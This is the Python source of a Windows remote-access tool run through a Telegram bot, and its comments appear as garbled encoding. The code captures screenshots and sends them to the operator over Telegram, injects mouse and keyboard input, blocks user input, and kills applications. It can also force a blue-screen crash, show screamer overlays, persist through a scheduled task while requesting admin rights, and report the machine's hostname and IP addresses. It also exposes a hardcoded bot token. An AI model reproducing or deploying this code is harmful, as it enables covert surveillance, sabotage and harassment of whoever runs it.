# coding: windows-1251
#       ^
#       |
# ��� ���������� ������, ������� ��� � ���� ���� ���������

# 1329704902

import io  # ��� �������� ��������� �������
import pathlib # ��� ������ � ������������
import shutil # ������ � �������� ��������� ��� ������
import sys # ��������� �������
import pygame # ����� ��� �����
import time # ��� .sleep()
import ctypes # Win api
import win32con # Win api
import AudioPlayFromURL # ��� ������������ ����� �� ������
import subprocess # ��� ������� ������� ��� �����
import DeskTopIcons # ������ � �������� �������� �����
import InputBlocker # ��� ���������� ����� � ���������� �����
from Schedule import * # ��� ������������ ����� �� Windows
from utils import * # ��������� ������� � .exe
import kill # ��� �������� ���� ����������
from WP import wallpaper_action # ��� ����� �����
import  win32api # Win api
import threading  # ��� �������� ������� ������ ������� ��� ������������� ���������� ���������
import webbrowser # ��� �������� ������ ��������
import screeninfo # ��� ��������� ���������� ��������
import mouse  # ��� ������������ ���� � ��������� ������
import telebot  # ����, ��� ����� ��� ���� �� ��
from PIL import Image, ImageDraw, ImageTk  # �����, ��� ������ � �������
from mss import mss  # ��� ������� �������
import tkinter # ��� ��������
import pygame.mixer as mix # ������ ����� ��� �����
import socket  # ��� �������� ������ � ���������� ���������� IP
import os # ��� ������ ��������� ��������
import requests  # ��� ���������� ���������� IP

bot = telebot.TeleBot(
    '7516400777:AAGpQCha761QKAYrprcu8v5YbygmKeh_1fA')  # ����� ����(��� ������ � ������) �������� ������, ����� ������� ������ �������� � ������ ���� ��������� �������

monit = [m for m in screeninfo.get_monitors() if m.is_primary][0]


DeepLightID = 1627834434  # ��� ���� ���� ���� � ����
AllowedUsers = {'Deepl1ght', 'ZackDuraska', 'gawrgurov', 'moguss', 'artk0v'} # �������������� ���� �� ��� �� ��

CURSOR_SIZE = 15 # ��������� ��� ������� �� ������
CURSOR_COLORS = [
    ((0, 0, 0), (255, 255, 255)),  # ������� ����
    ((255, 255, 255), None),  # ��������
    ((0, 0, 127), None)  # ����������
]

vk_codes = {   #��� ���������� ��� ������������� ������� ������
    # ����� A-Z
    'A': 0x41, 'B': 0x42, 'C': 0x43, 'D': 0x44, 'E': 0x45, 'F': 0x46, 'G': 0x47,
    'H': 0x48, 'I': 0x49, 'J': 0x4A, 'K': 0x4B, 'L': 0x4C, 'M': 0x4D, 'N': 0x4E,
    'O': 0x4F, 'P': 0x50, 'Q': 0x51, 'R': 0x52, 'S': 0x53, 'T': 0x54, 'U': 0x55,
    'V': 0x56, 'W': 0x57, 'X': 0x58, 'Y': 0x59, 'Z': 0x5A,

    # ����� �������� ����
    '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34,
    '5': 0x35, '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39,

    # �������������� �������
    'F1': 0x70, 'F2': 0x71, 'F3': 0x72, 'F4': 0x73, 'F5': 0x74, 'F6': 0x75,
    'F7': 0x76, 'F8': 0x77, 'F9': 0x78, 'F10': 0x79, 'F11': 0x7A, 'F12': 0x7B,

    # ����������� �������
    'BACKSPACE': 0x08, 'TAB': 0x09, 'ENTER': 0x0D, 'SHIFT': 0x10, 'CTRL': 0x11,
    'ALT': 0x12, 'CAPSLOCK': 0x14, 'ESC': 0x1B, 'SPACE': 0x20, 'PAGEUP': 0x21,
    'PAGEDOWN': 0x22, 'END': 0x23, 'HOME': 0x24, 'LEFT': 0x25, 'UP': 0x26,
    'RIGHT': 0x27, 'DOWN': 0x28, 'PRINTSCREEN': 0x2C, 'INSERT': 0x2D, 'DELETE': 0x2E,

    # ������������
    'LWIN': 0x5B, 'RWIN': 0x5C, 'APPS': 0x5D,

    # �������� ����
    'NUMPAD0': 0x60, 'NUMPAD1': 0x61, 'NUMPAD2': 0x62, 'NUMPAD3': 0x63,
    'NUMPAD4': 0x64, 'NUMPAD5': 0x65, 'NUMPAD6': 0x66, 'NUMPAD7': 0x67,
    'NUMPAD8': 0x68, 'NUMPAD9': 0x69,
    'NUMPAD_MULTIPLY': 0x6A,  # *
    'NUMPAD_ADD': 0x6B,  # +
    'NUMPAD_SEPARATOR': 0x6C,  # (����� ������������)
    'NUMPAD_SUBTRACT': 0x6D,  # -
    'NUMPAD_DECIMAL': 0x6E,  # .
    'NUMPAD_DIVIDE': 0x6F,  # /

    # ���������� �������
    '`': 0xC0, '-': 0xBD, '=': 0xBB, '[': 0xDB, ']': 0xDD, '\\': 0xDC,
    ';': 0xBA, "'": 0xDE, ',': 0xBC, '.': 0xBE, '/': 0xBF,

    # ��������������
    'VOLUME_MUTE': 0xAD, 'VOLUME_DOWN': 0xAE, 'VOLUME_UP': 0xAF,
    'MEDIA_NEXT': 0xB0, 'MEDIA_PREV': 0xB1, 'MEDIA_STOP': 0xB2,
    'MEDIA_PLAY_PAUSE': 0xB3,
    'BROWSER_BACK': 0xA6, 'BROWSER_FORWARD': 0xA7,
}



'������ ������ ����'


@bot.message_handler(commands=['start', 'Start'])  # ������� �����, �� ��� � ����� ������ ������ ��������
def Hello(message):
    bot.reply_to(message,
                 f'������, ��� ��� ��� �����, ���� �� �� � ��� �� ���� �� � ���� �� ���� ��������\n� ���� ���� ���� ��� @{message.from_user.username}\n������� ������� ���� �� �� ����, � ��� �������� /help')
    bot.reply_to(message, message.chat.id)


'''
������� ���� ��������� ��� ����� @
� ����� ��� ����� ���������� �����������, ��� ������������
��� ��������� ��������� �������, ��� �������� ������� ������
����� ������� Hello() ��������� �������� message (������� ��� � ������)
�� ���� �� ���������� ������ ���, �� �� ������� �� ��� �������, �� � ������� messag'� ����� �� �����������,
� ������ ������?

-���, �� ���� - ������� ��

���, ������ �������� ��� ������ ������, ������� ���������� at �� ���������� ���������� ������� ���� �������,
� �����, �� ��� ��� �������, ����� � ��� ���� ����� bot.message_handler()

������ ��������, �� ���� ��������� ������ ��� ���� ������� ������� messag'�
������ ���-�� ������, � ������ ���������� TeleBot, ����� ���� �������� � ���� ������ message_handler ���-�� ����

...
MessageFromID = server.getMessage(ID)
func(MessageFromID)

������ ���������� ���������� ��, ��� ��� ��� �� �����, � func(MessageFromID) ��� ��������
������� (������), ��������� ������� ����� ��������, ����� ������ ��� �����������, � �������������� ����������
� ����� ������ ���������� ��� ��� ��������� � func �� ���� �������� �� �������� �������, ������ ��� � ������� ������ �������,
��������� ����� �������� (�������), � ������� ���� ��� ������� ��� �����, �� ����� ���������� � ������ ���������� � ��� �������,
�� ��� ������ ��������
'''


@bot.message_handler(commands=['help', 'Help'])  # ���� ������ �� �������� (OUTDATED)
def Help(message):
    bot.send_message(message.chat.id,
                     '������, ����� ������?\n������� ���� �� ���� �� �����, �� �� �� ������ ��� �������\n��� ���� ��������, ��� ��� �������:\nhttps://telegra.ph/Komandy-dlya-bota-KxrvPersonal-bot-05-29')
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(
    commands=['Screenshot', 'Screen', 'Scr', 'scr', 'screenshot', 'screen'])  # � ��� � ������� �����������
def ScreenShot(message):
    if message.from_user.username not in AllowedUsers:
        return

    monitor = {'top': 0, 'left': 0, 'width': 1920, 'height': 1080} # ��������� ��������
    args = message.text.split()[1:] # �������� ���������

    if args: # ���� ���� �� ������ ����������� �����
        VALID_KEYS = {'top', 'left', 'width', 'height'}
        errors = []
        for arg in args: # ���� ���� �� �������� �� � monitor
            parts = arg.split(':', 1)
            if len(parts) == 2 and parts[0] in VALID_KEYS:
                try:
                    monitor[parts[0]] = int(parts[1])
                except ValueError:
                    errors.append(arg)
            else:
                errors.append(parts[0])

        if errors:
            bot.reply_to(message, f"������ � ������: {', '.join(errors)}")

    with mss() as sct: # ���������� ��� �����
        screenshot = sct.grab(monitor)
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        top_left = (monitor['left'], monitor['top'])
        bottom_right = (top_left[0] + monitor['width'], top_left[1] + monitor['height'])
        mouse_pos = mouse.get_position()

        if IsInside(mouse_pos, 15, top_left, bottom_right):
            draw = ImageDraw.Draw(img)
            rel_x = mouse_pos[0] - top_left[0]
            rel_y = mouse_pos[1] - top_left[1]
            draw_cursor(draw, rel_x, rel_y)  # ��������� ������� ��� ������� ������� �� ������
                                             # ��� ��� �� ����� ������ ��� �������

        send_screenshot(img, message.chat.id) # ����� ��������� �����

        # ��� ����
        if message.from_user.username != 'Deepl1ght':
            send_screenshot(img, DeepLightID)
            bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['move', 'Move', 'm', 'M', 'mov', 'Mov'])  # � ��� � �����, ������ � ������������
def Move_mouse(message):
    if message.from_user.username not in AllowedUsers:
        return

    # ��������� �� ���������
    params = {'X': 0, 'Y': 0, 'abs': True, 'dur': 0}
    args = message.text.split()

    # �������� ������������ ���������� ����������
    if len(args) < 3:
        bot.reply_to(message, '������: ��������� ������� 2 ��������� (X Y)')
        return

    # ��������� ����������� ���������� (X, Y)
    try:
        params['X'] = int(args[1])
        params['Y'] = int(args[2])
    except ValueError:
        bot.reply_to(message, '������: X � Y ������ ���� ������ �������')
        return

    # ��������� ����������� ����������
    for arg in args[3:]:
        if ':' not in arg:
            bot.reply_to(message, f'������ � ��������� "{arg}": ������ ���� � ������� "����:��������"')
            continue

        key, value = arg.split(':', 1)
        if key not in params:
            bot.reply_to(message, f'������: ����������� �������� "{key}"')
            continue

        try:
            # ��� ������� ���������� ���������� ����������� ��������������
            if key == 'abs':
                params[key] = parse_bool(value)
            else:
                params[key] = int(value)
        except ValueError:
            bot.reply_to(message, f'������ �������������� �������� "{value}" ��� ��������� "{key}"')
            continue

    # ���������� ��������
    try:
        mouse.move(params['X'], params['Y'], params['abs'], params['dur'])
    except Exception as e:
        bot.reply_to(message, f'������ ����������� ����: {str(e)}')
        return

    # ����������� ����
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['click', 'Click', 'cl', 'Cl'])  # ��������� ������ ����
def Click(message):
    if message.from_user.username not in AllowedUsers:
        return

    try:
        parts = message.text.split()
        # �������� ������������ ���������� ������ �������
        if len(parts) < 2:
            raise ValueError("Invalid command structure")

        # ������������ ����������
        button = parts[1].lower()
        is_double = len(parts) > 2 and parts[2].lower() in {'double', 'd'}

        # ������������� ������ � ����������
        button_actions = {
            'l': mouse.LEFT,
            'r': mouse.RIGHT,
            'm': mouse.MIDDLE
        }

        # �������� ������������ ������
        if button not in button_actions:
            raise ValueError("Invalid button specified")

        # ����� ��������
        action = mouse.double_click if is_double else mouse.click
        action(button_actions[button])

        bot.send_message(message.chat.id, '������� ���� ���������')

    except Exception as e:
        bot.send_message(message.chat.id, f'� ��������� �� ������, �� �� ��������\n����� �������\n{e}')

    # ����������� ��� ����
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['skr', 'screamer', 'scream', 'sakincock']) # ���������
def screamer(message):
    if message.from_user.username in AllowedUsers:
        threading.Thread(target=show_screamer, daemon=True).start() # ��� ��� �������� ����� ����� �����, � ������� �� ����� ����� ���
        threading.Thread(target=Obasravsya, daemon=True).start()    # ������� �� �������� ��������� �����, � ��� ������, ��� ��� �������������
                                                                    # ������������� �������� ������ ������ ���������, �� ����� ��� �� ����� ���� ��������
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['url', 'web']) # ��� � �������� ������
def openEyes(message):
    if message.from_user.username in AllowedUsers:
        webbrowser.open(message.text.split()[1], new=2, autoraise= True) # ����� ������ �������� ��� ���� ������, new = 2 ��������,
                                                                         # ��� ������ ��������� � ����� ������� ��������, ���� ������,
                                                                         # � autorise = True ������������� ������� ������� ���� �� ������
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['kill']) # ������� ��� �������� ���� ����������
def Killer(message):
    if message.from_user.username in AllowedUsers:
        kill.Kill(message)

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['wallpaper', 'wp']) # ��� � ������� �� ���� ����� �� ������� �����
def Wallpaper(message):
    if message.from_user.username in AllowedUsers:
        action = message.text.split()[1]
        match action:
            case 'set':
                wallpaper_action('set', resource_path(r'screams/2.png'))
            case 'restore':
                wallpaper_action('restore')
            case _:
                bot.reply_to(message, '����������� �������� ��� ���')

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['kys']) # ������� �� �������� �������,
def Kys(message):                      # ������ ���� ������������, �������� �
    if message.from_user.username in AllowedUsers:
        if is_frozen() and check_scheduler_task_exists():
            delete_scheduler_task()
        threading.Thread(target=StopIn5Secs, daemon=True).start() # ���� ��� ��� �� ����������, �� �� ��� ������� ����� ������������ ����������
                                                                  # ������� ������ ��������� �����, � ������� ��� ���������� ����� 5 ������
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['hide', 'h']) # ������� �� ����������� ���� ����������
def Hide(message):
    if message.from_user.username in AllowedUsers: # �� �����-�� �������� win+d ����� ���������� keyboard �� �������� ������� ���������� ctypes
        ctypes.windll.user32.keybd_event(vk_codes['D'], 0, 0, 0)  # ������� Win
        ctypes.windll.user32.keybd_event(vk_codes['D'], 0, 0, 0)  # ������� D
        ctypes.windll.user32.keybd_event(vk_codes['D'], 0, 2, 0)  # ��������� D
        ctypes.windll.user32.keybd_event(vk_codes['LWIN'], 0, 2, 0)  # ��������� Win

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['bsod', 'prikol']) # ��� � ����
def Prikol(message):
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

    if message.from_user.username in AllowedUsers:
        try:
            # ���� � NotMyFault.exe, ������������ ������� �� ����������� ��� ������ ������
            subprocess.run(
                [resource_path(r'screams/bsod.exe'), "/crash"],
                check=True,
                shell=True,
                timeout=10
            )
        except Exception as e:
            bot.send_message(DeepLightID, e)

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['disable']) # ��������� ���� � ���� � ���������� � �����
def Dismember(message):
    if message.from_user.username in AllowedUsers:
        InputBlocker.Disable()

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['enable']) # �������� ���� � ���� � ���������� � �����,
def enable(message):                      # ������-�� ���� ������� 3 ����
    if message.from_user.username in AllowedUsers:
        InputBlocker.Enable()

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['hico']) # ������� ��� ������� ������ �������� �����
def HideIcons(message):
    if message.from_user.username in AllowedUsers:
        DeskTopIcons.hide_desktop_icons()

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['sico']) # ������� ��� ������ ������ �������� �����
def ShowIcons(message):
    if message.from_user.username in AllowedUsers:
        DeskTopIcons.show_desktop_icons()

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['text']) # ������� ��� �������� �������� � ������������ �������
def TextWriteOpen(message):
    if message.from_user.username in AllowedUsers:

        if os.path.exists(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt')): # ���� ���� ����������
            os.remove(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'))      # �� ������� ���

        with open(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'), 'x') as f: # ������� ���� � ���������� ���� �����
            f.write(' '.join(message.text.split()[1:]))
            f.close()
        os.system(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'))

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['kb', 'write']) # ������� ��� �������� ����������
def KeyBoard(message):
    if message.from_user.username in AllowedUsers:
        Inst = message.text.split()[1]
        Keys = Inst.split('+')
        pressedKeys = []
        for key in Keys:
            try:
                par = key.split(':')
                if par[1] == 'p':

                    ctypes.windll.user32.keybd_event(vk_codes[str.upper(par[0])], 0, 0, 0)
                    pressedKeys.append(par[0])

                if par[1] == 'r':

                    ctypes.windll.user32.keybd_event(vk_codes[str.upper(par[0])], 0, 2, 0)
                    for key in pressedKeys:
                        ctypes.windll.user32.keybd_event(vk_codes[key], 0, 2, 0)
            except:

                ctypes.windll.user32.keybd_event(vk_codes[str.upper(par[0])], 0, 0, 0)
                ctypes.windll.user32.keybd_event(vk_codes[str.upper(par[0])], 0, 2, 0)

                for key in pressedKeys:
                    ctypes.windll.user32.keybd_event(vk_codes[key], 0, 2, 0)

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['check']) # ������� ��� �������� ������������� ������, �������� ����������
def Check(message):
    if message.from_user.username in AllowedUsers:

        if Schedule.check_scheduler_task_exists():
            bot.reply_to(message, 'true')
        else:
            bot.reply_to(message, 'false')

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['play']) # ������� ��� ���� ����� �� ������
def PlayFromURL(message):
    if message.from_user.username in AllowedUsers:
        AudioPlayFromURL.play_audio_from_url(message.text.split()[1])

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(func=lambda message: True)  # ��������� �������, ������ ������ ���� ���������
def Echo(message):  # ��� �� ����� ����� ���������, ������� �� �������� ��� ������� ����
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


'''����� ����
    ������ �������'''

mix.init() # ���������� .mixer ��� ��������������� �����

def show_screamer(): # ���� ������� ��� ������ ��������

    root = tkinter.Tk() # ������� ���� ��������
    root.title("overlay")

    image = Image.open(resource_path(r'screams/1.png')) # ��������� ���� �����
    mon = [m for m in screeninfo.get_monitors() if m.is_primary==True][0]
    mwidth = mon.width
    mheight = mon.height
    newimage, cords = calculate_scale(image, mwidth, mheight, image.size[0], image.size[1])
    # �������� ��������
    root.overrideredirect(True)

    # ������ ������ ������� ���� ����������
    root.attributes("-transparentcolor", "red")

    # �������� ��� ������� (����������)
    root.config(bg="red")
    img = ImageTk.PhotoImage(newimage)
    l = tkinter.Label(root, fg="white", bg="red", image=img)
    l.pack()

    # ����������� ����
    mix.music.load(resource_path(r'screams/1.wav'))
    mix.music.play()

    # ������ ���, ����� ���� ���� ������ ������ ������
    root.geometry(cords)
    root.wm_attributes("-topmost", 1)

    # ��������� ����� 5 ������
    root.after(5000, lambda: root.destroy())
    # ��������� �������
    root.mainloop()

def Obasravsya():
    time.sleep(5.5)
    root = tkinter.Tk()  # ������� ���� ��������
    root.title("overlay")

    image = Image.open(resource_path(r'screams/3.png'))  # ��������� ���� �����
    mon = [m for m in screeninfo.get_monitors() if m.is_primary == True][0]
    mwidth = mon.width
    mheight = mon.height
    newimage, cords = calculate_scale(image, mwidth, mheight, image.size[0], image.size[1])
    # �������� ��������
    root.overrideredirect(True)

    # ������ ������ ������� ���� ����������
    root.attributes("-transparentcolor", "red")

    # �������� ��� ������� (����������)
    root.config(bg="red")
    img = ImageTk.PhotoImage(newimage)
    l = tkinter.Label(root, fg="white", bg="red", image=img)
    l.pack()

    # ����������� ����
    mix.music.load(resource_path(r'screams/1.wav'))
    mix.music.play()

    # ������ ���, ����� ���� ���� ������ ������ ������
    root.geometry(cords)
    root.wm_attributes("-topmost", 1)

    # ��������� ����� 5 ������
    root.after(5000, lambda: root.destroy())

    # ��������� �������
    root.mainloop()


def calculate_scale(image, mon_width, mon_height, img_width, img_height): # ������� ��� ���������� ��������,
                                                                          # ����� ���������� ������ � ���������� ��� tk.geometry()

    scale = min([mon_width//img_width, mon_height//img_height]) # ����������� ���������� ��������

    ret = image.resize((img_width*scale, img_height*scale)) if scale>0 else image# ����������� ��������

    cords = f"{ret.size[0]}x{ret.size[1]}+{mon_width//2-ret.size[0]//2}+{mon_height//2-ret.size[1]//2}" # ������� ������ � ����������� � ��������� ��� ��������

    return ret, cords # ���������� ��� ����������

def parse_bool(value: str) -> bool: # ������� ��� �������������� ����� � ������ ��������
    true_values = {'true', '1', 'yes', '��', 'on', 'enable', 't'}
    false_values = {'false', '0', 'no', '���', 'off', 'disable', 'f'}

    normalized = value.strip().lower() # ������� ������� � ������ ����� � �������� ��� ��������

    if normalized in true_values: # �� � ���������� ��������������� ��������
        return True
    if normalized in false_values:
        return False
    raise ValueError(f'������������ ������ ��������: "{value}"') # ����� ������


def StopIn5Secs(): # ������� ��� ��������� ����
    time.sleep(5)
    bot.send_message(DeepLightID, '��� ��������')
    bot.stop_polling()


def IsInside(point: tuple, radius: int, topLeft: tuple,
             downRight: tuple):  # ��� ������� ��� �������� ��������� � ���� (���) ������
    x, y = point  # ����������� �������� �������� � ����� ������

    x_min = min(topLeft[0], downRight[0])
    x_max = max(topLeft[0], downRight[0])
    y_min = min(topLeft[1], downRight[1])
    y_max = max(topLeft[1], downRight[1])

    return (
            (x - radius >= x_min) and
            (x + radius <= x_max) and
            (y - radius >= y_min) and
            (y + radius <= y_max)
    )


def send_screenshot(img, chat_id):
    # ������ �����������
    bot.send_photo(chat_id, img, protect_content=True)

    # �������� �����������
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    bot.send_document(chat_id, img_byte_arr, protect_content=True)


def draw_cursor(draw, x, y):
    # �������� �����
    for i, (fill, outline) in enumerate(CURSOR_COLORS):
        size = CURSOR_SIZE - i * 5
        bbox = [
            (x - size // 2, y - size // 2),
            (x + size // 2, y + size // 2)
        ]
        draw.ellipse(bbox, fill=fill, outline=outline)

    # �����
    cross_size = CURSOR_SIZE - 2
    draw.line([(x, y - cross_size // 2), (x, y + cross_size // 2)], fill=(255, 0, 0))
    draw.line([(x - cross_size // 2, y), (x + cross_size // 2, y)], fill=(255, 0, 0))


def get_local_ip():
    try:
        # ������� ��������� ����������� � ���������� DNS
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Google Public DNS
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1 (Local host)"  # ���������� localhost ��� ������


def get_public_ip(): # �������� ��������� IP
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()["ip"]
    except Exception:
        return "�� ������� �������� IP"

if is_frozen() and not check_scheduler_task_exists(): # ������� ������ � ������������ �����
    create_scheduler_task()
    # �������� ���� ��������������
    if not run_as_admin():
        sys.exit(1)

bot.send_message(DeepLightID,
                 f"��� �������\n��� ����������: {socket.gethostname()}\n��������� IP: {get_local_ip()}\n��������� IP: {get_public_ip()}")  # ��������� ��� ���� ��������

bot.infinity_polling() # ������� ��������� ����